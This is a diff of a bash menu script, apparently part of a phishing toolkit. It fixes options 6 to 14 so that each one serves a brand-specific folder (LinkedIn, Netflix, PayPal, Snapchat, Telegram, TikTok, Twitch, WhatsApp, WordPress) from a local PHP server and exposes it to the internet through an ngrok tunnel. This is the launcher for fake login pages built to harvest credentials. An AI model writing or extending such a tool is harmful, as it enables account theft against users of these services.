@@ -63,53 +63,53 @@ elif [ $n -eq 6 ];
 then
         echo "please wait ...."
         sleep 0.5
-        cd sites && cd twitter && php -S localhost:4444 & ./ngrok http 4444
+        cd sites && cd linkedin && php -S localhost:4444 & ./ngrok http 4444
 elif [ $n -eq 7 ];
 then
         echo "please wait ...."
         sleep 0.5
-        cd sites && cd twitter && php -S localhost:4444 & ./ngrok http 4444
+        cd sites && cd netflix && php -S localhost:4444 & ./ngrok http 4444
 elif [ $n -eq 8 ];
 then
         echo "please wait ...."
         sleep 0.5
-        cd sites && cd twitter && php -S localhost:4444 & ./ngrok http 4444
+        cd sites && cd paypal && php -S localhost:4444 & ./ngrok http 4444
 
 elif [ $n -eq 9 ];
 then
         echo "please wait ...."
         sleep 0.5
-        cd sites && cd twitter && php -S localhost:4444 & ./ngrok http 4444
+        cd sites && cd snapchat && php -S localhost:4444 & ./ngrok http 4444
 
 elif [ $n -eq 10 ];
 then
         echo "please wait ...."
         sleep 0.5
-        cd sites && cd twitter && php -S localhost:4444 & ./ngrok http 4444
+        cd sites && cd telegram && php -S localhost:4444 & ./ngrok http 4444
 
 elif [ $n -eq 11 ];
 then
         echo "please wait ...."
         sleep 0.5
-        cd sites && cd twitter && php -S localhost:4444 & ./ngrok http 4444
+        cd sites && cd tiktok && php -S localhost:4444 & ./ngrok http 4444
 
 elif [ $n -eq 12 ];
 then
         echo "please wait ...."
         sleep 0.5
-        cd sites && cd twitter && php -S localhost:4444 & ./ngrok http 4444
+        cd sites && cd twitch && php -S localhost:4444 & ./ngrok http 4444
 	
 elif [ $n -eq 13 ];
 then
         echo "please wait ...."
         sleep 0.5
-        cd sites && cd twitter && php -S localhost:4444 & ./ngrok http 4444
+        cd sites && cd whatsapp && php -S localhost:4444 & ./ngrok http 4444
 
 elif [ $n -eq 14 ];
 then
         echo "please wait ...."
         sleep 0.5
-        cd sites && cd twitter && php -S localhost:4444 & ./ngrok http 4444
+        cd sites && cd wordpress && php -S localhost:4444 & ./ngrok http 4444
 
 fi
     echo " please try again....." 
